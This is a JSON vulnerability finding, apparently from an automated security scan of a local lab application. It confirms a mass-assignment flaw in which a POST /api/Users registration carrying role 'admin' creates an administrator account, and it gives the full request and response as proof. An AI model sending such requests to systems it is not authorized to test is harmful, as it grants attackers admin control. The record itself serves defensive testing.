@@ -1,0 +1,28 @@
+{
+  "id": "f_1784835438118_302521",
+  "action": "confirm",
+  "title": "Mass Assignment - Privilege Escalation via User Registration",
+  "severity": "high",
+  "finding_kind": "vuln",
+  "location": "POST /api/Users",
+  "url": "POST /api/Users",
+  "description": "The POST /api/Users registration endpoint accepts arbitrary role assignments. By including {\"role\":\"admin\"} in the request body, a standard user registration creates an administrator account. The response confirms \"role\":\"admin\" and \"profileImage\":\"/assets/public/images/uploads/defaultAdmin.png\" (admin-specific). This is a classic mass assignment vulnerability allowing any user to escalate privileges to admin.",
+  "poc": "POST /api/Users with JSON body: {\"email\":\"admin2@test.com\",\"password\":\"Test12345!\",\"role\":\"admin\"} → admin account created successfully",
+  "proof": "Request:\nPOST /api/Users\n{\"email\":\"admin2@test.com\",\"password\":\"Test12345!\",\"role\":\"admin\"}\n\nResponse (201 Created):\n{\"status\":\"success\",\"data\":{\"username\":\"\",\"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"0.0.0.0\",\"profileImage\":\"/assets/public/images/uploads/defaultAdmin.png\",\"isActive\":true,\"id\":25,\"email\":\"admin2@test.com\",\"updatedAt\":\"2026-07-23T19:36:35.201Z\",\"createdAt\":\"2026-07-23T19:36:35.201Z\",\"deletedAt\":null}}\n\nThe profile image URL confirms admin role: defaultAdmin.png vs default.svg for regular users.",
+  "how_captured": "POST http://127.0.0.1:3011/api/Users → 201",
+  "evidence_ids": [
+    "ev_1784835436980_6459df"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784835436980_6459df",
+      "excerpt": "Request:\nPOST /api/Users\n{\"email\":\"admin2@test.com\",\"password\":\"Test12345!\",\"role\":\"admin\"}\n\nResponse (201 Created):\n{\"status\":\"success\",\"data\":{\"username\":\"\",\"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"0.0.0.0\",\"profileImage\":\"/assets/public/images/uploads/defaultAdmin.png\",\"isActive\":true,\"id\":25,\"email\":\"admin2@test.com\",\"updatedAt\":\"2026-07-23T19:36:35.201Z\",\"createdAt\":\"2026-07-23T19:36:35.201Z\",\"deletedAt\":null}}\n\nThe profile image URL confirms admin role: defaultAdmin.png vs default.svg for regular users.",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "POST http://127.0.0.1:3011/api/Users → 201"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3011",
+  "created_at": "2026-07-23T19:37:18.118Z"
+}
